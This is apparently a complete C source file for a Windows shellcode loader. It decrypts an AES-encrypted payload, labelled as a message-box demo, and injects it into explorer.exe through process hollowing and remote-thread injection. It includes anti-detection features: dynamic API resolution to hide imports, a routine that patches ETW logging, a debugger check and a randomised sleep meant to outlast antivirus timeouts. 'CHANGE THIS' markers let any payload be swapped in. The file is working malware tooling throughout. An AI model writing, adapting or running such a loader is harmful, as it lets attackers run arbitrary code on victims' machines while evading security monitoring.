#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include "winapi.h"

// Link to Windows system libraries
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ws2_32.lib")

// Crypt parameters
#define AES_KEY_SIZE 32  // 256 bits for AES-256
#define AES_BLOCK_SIZE 16

// CHANGE THIS
#define ORIGINAL_SHELLCODE_LENGTH 244

// CHANGE THIS
const char* processinj = "C:\\windows\\explorer.exe";
//const char* processinj = "C:\\Program Files\\WinSCP\\WinSCP.exe";
//const char* processinj = "C:\\windows\\system32\\notepad.exe";

// CHANGE THIS
unsigned char ivEnc[AES_BLOCK_SIZE] = {
  "\x79\x10\x94\x0F\x02\x3D\xBC\xEB\x1A\xC1\x0C\xE5\x1B\x00\xD0\xB7"
};
// CHANGE THIS
unsigned char salt[16] = {
  "\xDC\x56\x35\x21\x64\x0B\x3C\x7E\x8E\x4B\x13\xE0\x49\x43\x12\x58"
};
// CHANGE THIS
unsigned char password[] = {
    "\x31\x32\x33\x34\x35\x36"
};
// CHANGE THIS
// Messagebox showing "HELLOHELLO"
unsigned char encrypted_shellcode[] =
{
"\x2C\x52\x26\x6C\x8D\x1F\xA7\x3B\x28\xC6\x5C\x10\x41\x95\xA0\x61\x0B\x38\xBC\xEC"
"\x4D\xAC\xCB\xDD\x98\x66\x0D\x9A\x6D\xC9\xA5\x9B\x32\xAB\xA4\x8D\x0C\xCD\xEE\xD7"
"\x1F\xAA\x5B\xBD\x28\xA0\xDF\x99\x75\xA7\x87\xCD\xF5\xBC\xCF\x21\x3A\xF3\xFA\xA6"
"\x61\x09\xFE\x5E\x8C\x5A\xC4\x5C\x27\xC1\x54\x3C\xD2\x57\x70\x10\x31\x04\x40\x06"
"\x99\x1F\x44\x87\x48\x94\xEE\x45\x30\xE0\x5B\xB7\xDE\x4B\xCF\x18\xEF\xC5\x9B\x5B"
"\x84\x17\x91\x96\xFA\x9D\x80\x19\x90\x0E\x9C\x37\xB0\x96\xBF\xCF\xC4\x10\x98\x88"
"\x81\x5E\xA0\xA4\x81\x1B\xAC\x5C\x95\x23\xD7\xFD\xA8\x9B\x4C\x4C\x08\x35\x09\x7A"
"\xBA\x31\xC9\x56\x22\x78\x1A\x8B\x46\xFD\xF9\x64\xA4\xD0\x9D\xA0\x6D\x61\xC9\xB7"
"\xF3\x6F\x04\xC3\x51\xE0\x59\x3F\x17\x2B\x71\x10\xD4\xC4\x03\xA1\x5F\x16\x6F\xD9"
"\x22\xB2\x14\x82\x3D\x69\x9D\xFA\x21\x96\x02\xF7\xF4\x0F\x0D\x9D\xB9\xA2\x57\x4B"
"\x18\x9B\xA7\xE3\x9A\x92\xF0\x55\x3E\xD0\x99\x87\xDA\x17\xDB\xB9\xF1\x3D\x14\x5E"
"\xE4\xA1\x02\x77\x67\xC3\xD6\x25\xB8\xD0\x71\xE8\x56\xEA\xA4\xF8\xE5\x98\x57\xDD"
"\x41\x59\xC7\x63\x9B\xF9\xC6\x95\xD3\x7D\x2E\xF5\x30\x76\x26\x01"
};

unsigned char decrypted_shellcode[ORIGINAL_SHELLCODE_LENGTH];

/* Output encrypted and decrypted */
void prt_dat(const char* title, const void* data, int len, int is_oneliner);
void cp_decr(unsigned char* shell_dec, int lenDecShell, unsigned char* shellcode, int original_len);
void cp_arr(unsigned char* src, unsigned char* dest, int src_len, int dest_len);
int decr(unsigned char* ciphertext, int ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* plaintext);
int find_proc(const char* process_name, int* pid, int* baseaddr);
void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len);
void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int targetPid);
int dis_ET(HANDLE hProcess);
void delay_ex();

int main(int argc, char** argv)
{
    // Variables
    int lenBits = AES_KEY_SIZE * 8;  // AES-256 (256 bits)
    int lenShell = ORIGINAL_SHELLCODE_LENGTH;  // Using the predefined length of original shellcode
    unsigned char derivedKey[AES_KEY_SIZE + AES_BLOCK_SIZE];  // Key and IV (256-bit key + 128-bit IV)
    int pid = 0;
    int baseaddr = 0;

    // Disable OpenSSL to load default config
    OPENSSL_config(NULL);

    // Derive key and IV using PBKDF2 from the hardcoded password and salt
    if (!PKCS5_PBKDF2_HMAC_SHA1((char*)password, strlen((char*)password), salt, sizeof(salt), 10000, sizeof(derivedKey), derivedKey)) {
        fprintf(stderr, "Error deriving key and IV with PBKDF2\n");
        exit(-1);
    }

    unsigned char* aesKey = derivedKey;
    unsigned char* ivDec = derivedKey + AES_KEY_SIZE;

    // Buffers for decryption
    const size_t lenDec = ((lenShell + AES_BLOCK_SIZE - 1) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;  // Ensure we have a multiple of AES_BLOCK_SIZE
    unsigned char* shell_dec = malloc(lenDec);  // Allocate memory for decrypted shellcode
    if (!shell_dec) {
        perror("malloc failed");
        exit(-1);
    }
    memset(shell_dec, 0, lenDec);  // Padding the encrypted data buffer

    // Decrypt the shellcode
    int lenDecShell = decr(encrypted_shellcode, lenDec, aesKey, ivDec, shell_dec);
    if (lenDecShell == 0) {
        fprintf(stderr, "Error finalizing AES decryption\n");
        free(shell_dec);
        return -1;
    }

    // Fill the shellcode with the repeated decrypted content
    cp_arr(shell_dec, decrypted_shellcode, lenShell, sizeof(decrypted_shellcode));

    // Print the decrypted shellcode
    prt_dat("\nDECRYPTED SHELLCODE", decrypted_shellcode, lenShell, 1);

    // Find the process ID of explorer.exe (or any other process like svchost.exe)
    find_proc(processinj,&pid,&baseaddr);

    // Check PID and inject decrypted shellcode into process
    if (pid != 0) {
        // Delay execution for some AV detection timeouts
        //delay_ex();

        // DEFUNCT; Disable ETW
        //dis_ET(pid);

        // Inject shellcode into process
        //inj_sc(pid, decrypted_shellcode, sizeof(decrypted_shellcode));

        // Inject shellcode into process using process hollowing
        proc_hol(decrypted_shellcode, sizeof(decrypted_shellcode), baseaddr, pid);
    }
    else {
        fprintf(stderr, "Failed to find the process %s\n", processinj);
        free(shell_dec);
        return -1;
    }

    // Free the allocated memory for the decrypted string
    free(shell_dec);

    return 0;
}

void cp_decr(unsigned char* shell_dec, int lenDecShell, unsigned char* shellcode, int original_len) {
    int index = 0;

    // Loop to repeat the decrypted shell_dec until the original shellcode length is reached
    while (index < original_len) {
        for (int i = 0; i < lenDecShell && index < original_len; i++) {
            shellcode[index++] = shell_dec[i];
        }
    }
}

void cp_arr(unsigned char* src, unsigned char* dest, int src_len, int dest_len) {
    // Calculate the number of elements to copy (whichever is smaller, src_len or dest_len)
    int len_to_copy = (src_len < dest_len) ? src_len : dest_len;

    for (int i = 0; i < len_to_copy; i++) {
        dest[i] = src[i];  // Copy elements from src to dest
    }
}

void prt_dat(const char* title, const void* data, int len, int is_oneliner)
{
    printf("%s:\n", title);
    unsigned char* p = (unsigned char*)data;

    if (is_oneliner) {
        printf("\"");
        for (int i = 0; i < len; i++) {
            printf("\\x%02X", p[i]);
        }
        printf("\"\n");
    }
    else {
        printf("  ");
        for (int i = 0; i < len; i++) {
            printf("\\x%02X", p[i]);
        }
        printf("\n");
    }
}

void* lookup_func(const char* moduleName, const char* functionName) {
    // Get the handle of the module (DLL)    
    HMODULE hModule = LoadLibraryA(moduleName);
    if (hModule == NULL) {
        // Module is not loaded, retrieve the last error and provide more information
        //DWORD error = GetLastError();
        //printf("Module not found: %s (Error Code: %lu)\n", moduleName, error);
        printf("Module not found: %s\n", moduleName);
        return NULL;
    }

    // Get the address of the function in the module
    FARPROC funcAddress = GetProcAddress(hModule, functionName);
    if (funcAddress == NULL) {
        // Function is not found, retrieve the last error for more context
        //DWORD error = GetLastError();
        //printf("Function not found: %s (Error Code: %lu)\n", functionName, error);
        printf("Function not found: %s\n", functionName);
        return NULL;
    }

    return funcAddress;
}

int find_proc(const char* process_name, int* pid, int* baseaddr) {
    DWORD processes[1024], cbNeeded, cProcesses;

    printf("\nFinding process ID and base address based on name %s ...\n", process_name);

    // Enumerate all processes
    pEnumProcesses NtEnumProcesses = (pEnumProcesses)lookup_func("psapi.dll", "EnumProcesses");
    if(!NtEnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        fprintf(stderr, "EnumProcesses failed\n");
        return 0;
    }

    cProcesses = cbNeeded / sizeof(DWORD);

    // Iterate through processes and match by executable name (case-insensitive)
    for (unsigned int i = 0; i < cProcesses; i++) {
        if (processes[i] == 0) continue;
        // Get the address of OpenProcess dynamically
        pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func("kernel32.dll", "OpenProcess");
        pEnumProcessModules NtEnumProcessModules = (pEnumProcessModules)lookup_func("psapi.dll", "EnumProcessModules");
        pGetModuleFileNameExA NtGetModuleFileNameExA = (pGetModuleFileNameExA)lookup_func("psapi.dll", "GetModuleFileNameExA");
        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");

        // Open the process with sufficient access rights only if it's a potential match
        HANDLE hProcess = NtOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
        if (hProcess != NULL) {
            // Check process modules using EnumProcessModules
            DWORD cbNeededModules;
            HMODULE hMods[1024];
            if (NtEnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeededModules)) {
                //printf("Found %lu modules for process %lu\n", cbNeededModules / sizeof(HMODULE), processes[i]);
                for (unsigned int j = 0; j < (cbNeededModules / sizeof(HMODULE)); j++) {
                    char filename[MAX_PATH];
                    if (NtGetModuleFileNameExA(hProcess, hMods[j], filename, sizeof(filename) / sizeof(char))) {
                        // Check if the filename matches the process_name (case-insensitive)
                        if (_stricmp(filename, process_name) == 0) {
                            *pid = (int)processes[i];
                            *baseaddr = (int)hMods[j];
                            printf("Found matching process: %d (%s)\nBase address: %d\n\n", *pid, filename, *baseaddr);
                            NtCloseHandle(hProcess);
                            return 1;
                        }
                    }
                }
            }
            NtCloseHandle(hProcess);
        }
    }
    return 0; // Process not found
}

void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len) {
    // Get the address of OpenProcess dynamically
    pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func("kernel32.dll", "OpenProcess");
    pGetLastError NtGetLastError = (pGetLastError)lookup_func("kernel32.dll", "GetLastError");

    // Open the target process with appropriate access
    HANDLE hProcess = NtOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProcess) {
        fprintf(stderr, "Failed to open process (PID: %lu) - Error: %lu\n", pid, NtGetLastError());
        return;
    }

    // Get address
    pVirtualAllocEx NtVirtualAllocEx = (pVirtualAllocEx)lookup_func("kernel32.dll", "VirtualAllocEx");

    // Allocate memory in the target process to store the shellcode
    LPVOID remoteMemory = NtVirtualAllocEx(hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        fprintf(stderr, "Failed to allocate memory in target process\n");
        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
        NtCloseHandle(hProcess);
        return;
    }

    // Write the shellcode to the allocated memory
    pWriteProcessMemory NtWriteProcessMemory = (pWriteProcessMemory)lookup_func("kernel32.dll", "WriteProcessMemory");
    if (!NtWriteProcessMemory(hProcess, remoteMemory, shellcode, shellcode_len, NULL)) {
        fprintf(stderr, "Failed to write shellcode to process memory\n");
        pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func("kernel32.dll", "VirtualFreeEx");
        NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
        NtCloseHandle(hProcess);
        return;
    }

    // Create a remote thread to execute the shellcode
    pCreateRemoteThread NtCreateRemoteThread = (pCreateRemoteThread)lookup_func("kernel32.dll", "CreateRemoteThread");
    HANDLE hThread = NtCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (!hThread) {
        fprintf(stderr, "Failed to create remote thread - Error: %lu\n", NtGetLastError());
        pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func("kernel32.dll", "VirtualFreeEx");
        NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
        NtCloseHandle(hProcess);
        return;
    }

    // Wait for the thread to finish execution (optional)
    pWaitForSingleObject NtWaitForSingleObject = (pWaitForSingleObject)lookup_func("kernel32.dll", "WaitForSingleObject");
    NtWaitForSingleObject(hThread, INFINITE);

    // Clean up: Close the thread handle and free the allocated memory
    pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
    NtCloseHandle(hThread);
    pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func("kernel32.dll", "VirtualFreeEx");
    NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    NtCloseHandle(hProcess);

    printf("Shellcode injected and executed successfully.\n");
}
// DEFUNCT
void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int targetPid)
{
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)lookup_func("ntdll.dll", "NtQueryInformationProcess");
    pCreateProcessA NtCreateProcessA = (pCreateProcessA)lookup_func("kernel32.dll", "CreateProcessA");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)lookup_func("ntdll.dll", "NtUnmapViewOfSection");
    pGetLastError NtGetLastError = (pGetLastError)lookup_func("kernel32.dll", "GetLastError");
    pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
    pTerminateProcess NtTerminateProcess = (pTerminateProcess)lookup_func("kernel32.dll", "TerminateProcess");
    pVirtualAllocEx NtVirtualAllocEx = (pVirtualAllocEx)lookup_func("kernel32.dll", "VirtualAllocEx");
    pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func("kernel32.dll", "VirtualFreeEx");
    pWriteProcessMemory NtWriteProcessMemory = (pWriteProcessMemory)lookup_func("kernel32.dll", "WriteProcessMemory");
    pWaitForSingleObject NtWaitForSingleObject = (pWaitForSingleObject)lookup_func("kernel32.dll", "WaitForSingleObject");
    pCreateRemoteThread NtCreateRemoteThread = (pCreateRemoteThread)lookup_func("kernel32.dll", "CreateRemoteThread");
    pResumeThread NtResumeThread = (pResumeThread)lookup_func("kernel32.dll", "ResumeThread");
    pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func("kernel32.dll", "OpenProcess");

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    PROCESS_BASIC_INFORMATION pbi;
    ULONG len = 0;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    ACCESS_MASK access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
    HANDLE hProcess = NtOpenProcess(access, FALSE, targetPid);
    if (!hProcess) {
        DWORD dwError = GetLastError();
        printf("Failed to open target process: 0x%X\n", dwError);
        return;
    }

    // Create the target process in a suspended state
    if (!NtCreateProcessA(NULL, processinj, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
    //if (!NtCreateProcessA(NULL, targetProc, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        // DWORD dwError = GetLastError();
        DWORD dwError = NtGetLastError();
        fprintf(stderr, "Failed to create process %s in suspended state\n", processinj);
        //fprintf(stderr, "Failed to create process %s in suspended state\n", targetProc);
        printf("CreateProcess failed with error code: %lu\n", dwError);
        return;
    }

    // Debug: print the base address to ensure it's correct
    //printf("Base Address of the Process: 0x%p\n", baseaddr);

    /*
    // Try to unmap the section with the correct base address
    NTSTATUS unmapStatus = NtUnmapViewOfSection(pi.hProcess, baseaddr);
    if (unmapStatus != 0) {
        fprintf(stderr, "Failed to unmap view of section in target process, Error Code: 0x%X\n", unmapStatus);
        // Handle error gracefully, terminate process if necessary
        NtTerminateProcess(pi.hProcess, 0);
        NtCloseHandle(pi.hProcess);
        NtCloseHandle(pi.hThread);
        return;
    }
    */

    // Allocate memory for the shellcode in the target process
    LPVOID remoteMemory = NtVirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        DWORD dwError = NtGetLastError();
        fprintf(stderr, "Failed to allocate memory in target process - Error: %lu\n", dwError);
        NtTerminateProcess(pi.hProcess, 0);
        NtCloseHandle(pi.hProcess);
        NtCloseHandle(pi.hThread);
        return;
    }

    // Write the shellcode to the allocated memory
    if (!NtWriteProcessMemory(pi.hProcess, remoteMemory, shellcode, shellcode_len, NULL)) {
        DWORD dwError = NtGetLastError();
        fprintf(stderr, "Failed to write shellcode to process memory - Error: %lu\n", dwError);
        NtVirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        NtTerminateProcess(pi.hProcess, 0);
        NtCloseHandle(pi.hProcess);
        NtCloseHandle(pi.hThread);
        return;
    }  

    // Create a remote thread to execute the shellcode
    HANDLE hThread = NtCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (!hThread) {
        DWORD dwError = NtGetLastError();
        fprintf(stderr, "Failed to create remote thread - Error: %lu\n", dwError);
        NtVirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        NtTerminateProcess(pi.hProcess, 0);
        NtCloseHandle(pi.hProcess);
        NtCloseHandle(pi.hThread);
        return;
    }

    // Wait for the thread to finish execution (optional)
    NtWaitForSingleObject(hThread, INFINITE);

    // Clean up: Close the thread handle and free the allocated memory
    NtCloseHandle(hThread);
    NtVirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);

    // Resume the process to start executing normally
    NtResumeThread(pi.hThread);

    // Clean up: Close the process handle
    NtCloseHandle(pi.hThread);
    NtCloseHandle(pi.hProcess);

    printf("Shellcode injected and executed using Process Hollowing.\n");
}

int decr(unsigned char* ciphertext, int ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* plaintext)
{
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    int len;
    int plaintext_len = 0;

    if (!ctx) {
        fprintf(stderr, "Error creating EVP cipher context\n");
        return 0;
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        fprintf(stderr, "Error initializing decryption\n");
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len)) {
        fprintf(stderr, "Error during decryption\n");
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    plaintext_len = len;

    if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) {
        fprintf(stderr, "Error finalizing decryption\n");
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}

int dbg_pres() {
    pIsDebuggerPresent NtIsDebuggerPresent = (pIsDebuggerPresent)lookup_func("kernel32.dll", "IsDebuggerPresent");
    return NtIsDebuggerPresent();
}

// Function to disable ETW in the target process
int dis_ET(HANDLE hProcess) {
    // The patch to disable ETW: xor rax, rax; ret
    unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };

    // Lookup function pointers for the required Windows APIs
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)lookup_func("ntdll.dll", "NtProtectVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)lookup_func("ntdll.dll", "NtWriteVirtualMemory");
    pFlushInstrucionCache NtFlushInstructionCache = (pFlushInstrucionCache)lookup_func("kernel32.dll", "FlushInstructionCache");
    pEventWrite NtEventWrite = (pEventWrite)lookup_func("advapi32.dll", "EventWrite");

    // Validate function pointers
    if (!NtProtectVirtualMemory || !NtWriteVirtualMemory || !NtFlushInstructionCache) {
        printf("Failed to load required functions.\n");
        return 0;
    }

    // Ensure the hProcess handle is valid
    if (hProcess == NULL) {
        printf("Invalid process handle.\n");
        return 0;
    }

    ULONG oldProtect = 0;
    SIZE_T patchSize = sizeof(patch); // Size of the patch to write into the target process memory

    // Get the current memory protection for NtEventWrite
    NTSTATUS status = NtProtectVirtualMemory(hProcess, &NtEventWrite, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0) {
        printf("Failed to change memory protection: 0x%X\n", status);
        return 0;
    }

    // Write the patch into the memory of the target process
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProcess, (PVOID)NtEventWrite, patch, patchSize, &bytesWritten);
    if (status != 0 || bytesWritten != patchSize) {
        printf("Failed to write to memory: 0x%X, Bytes written: %zu\n", status, bytesWritten);
        // Restore the original memory protection before returning
        NtProtectVirtualMemory(hProcess, (PVOID*)&NtEventWrite, &patchSize, oldProtect, &oldProtect);
        return 0;
    }

    // After patching, restore the original memory protection
    status = NtProtectVirtualMemory(hProcess, (PVOID*)&NtEventWrite, &patchSize, oldProtect, &oldProtect);
    if (status != 0) {
        printf("Failed to restore memory protection: 0x%X\n", status);
        return 0;
    }

    // Flush the instruction cache to ensure the patched code is executed properly
    NtFlushInstructionCache(hProcess, (PVOID)NtEventWrite, patchSize);

    printf("Successfully disabled ETW in target process by patching EtwEventWrite.\n");
    return 1;
}

void delay_ex() {
    srand(time(NULL));
    int delay = rand() % 30000 + 10000; // Random delay between 10 and 30 seconds
    Sleep(delay);
}